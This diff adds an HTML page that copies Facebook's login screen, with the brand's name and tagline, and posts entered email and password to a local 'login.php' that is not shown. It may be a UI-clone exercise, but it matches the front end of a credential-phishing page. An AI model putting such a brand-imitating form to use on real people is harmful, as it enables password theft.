@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container-fluid h-100">
+        <div class="row h-100">
+            <div class="col-md-6 left-section d-flex align-items-center justify-content-center">
+                <div class="text-center">
+                    <h1 class="display-3 text-white">Facebook</h1>
+                    <p class="lead text-white">Connect with friends and the world around you on Facebook.</p>
+                </div>
+            </div>
+            <div class="col-md-6 right-section d-flex align-items-center justify-content-center">
+                <div class="login-container">
+                    <form action="login.php" method="POST">
+                        <div class="form-group">
+                            <input type="text" class="form-control" name="email" placeholder="Email or Phone Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" class="form-control" name="password" placeholder="Password" required>
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-block">Log In</button>
+                    </form>
+                    <a href="#" class="d-block text-center mt-3">Forgotten account?</a>
+                    <div class="separator my-4"></div>
+                    <button class="btn btn-success btn-block">Create New Account</button>
+                </div>
+                <p class="text-center mt-4"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
